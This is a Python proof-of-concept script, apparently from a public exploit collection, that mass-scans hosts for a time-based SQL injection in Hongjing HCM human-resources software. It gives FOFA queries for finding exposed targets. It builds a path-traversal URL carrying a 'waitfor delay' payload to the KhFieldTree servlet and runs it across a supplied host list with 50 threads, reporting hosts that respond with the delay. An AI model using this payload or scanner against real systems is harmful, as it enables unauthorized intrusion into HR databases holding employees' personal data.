#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa:app="HJSOFT-HCM"
# FOFA：body='<div class="hj-hy-all-one-logo"'


import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
import time

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+-------------------------------------------------------------------------------------------------- -------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                       +')
    print(
        '+ EXP: python3 Hongjing_HCM_KhFieldtree_Sql_Poc.py url.txt                                                  +')
    print(
        '+-------------------------------------------------------------------------------------------------- --------+')
    sys.exit()

def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Host":"%s" % host2
    }
    vulurl = url + "/templates/attestation/.%2e/.%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=1';waitfor+delay+'0:0:5'+--"
    try:
        start_time = time.time()
        r = requests.get(vulurl, headers=headers)
        end_time = time.time()
        response_time = end_time - start_time
        if r.status_code==200 and response_time >5 and response_time<6 :
            print(host+" :true 延时注入时间:"+str(response_time)[:6]+"s")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])